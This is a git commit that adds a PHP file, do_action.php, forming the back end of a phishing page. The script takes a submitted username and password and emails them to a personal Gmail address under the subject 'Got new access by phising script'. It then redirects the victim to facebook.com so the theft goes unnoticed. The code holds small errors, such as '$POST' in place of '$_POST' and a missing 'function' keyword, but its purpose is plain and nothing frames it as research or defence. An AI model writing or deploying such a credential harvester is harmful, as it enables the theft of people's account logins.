c38931365171602be18a57ab3cd79bf48b5ee032
Bishal Tharu <69636348+royalbishal@users.noreply.github.com>
2020-08-13 07:02:07 -0700

    Add files via upload

---
+++ do_action.php
@@ -0,0 +1,18 @@
+<?php
+	mail_sender(){
+		$username = $POST['username'];
+		$password = $POST['password'];
+		
+		$reciever = "bishaldangaura732@gmail.com";
+		
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+		
+		return mail($reciever, $subject, $message);
+	}
+	
+	if(mail_sender()){
+		header("Location: http://www.facebook.com");
+	}
+?>
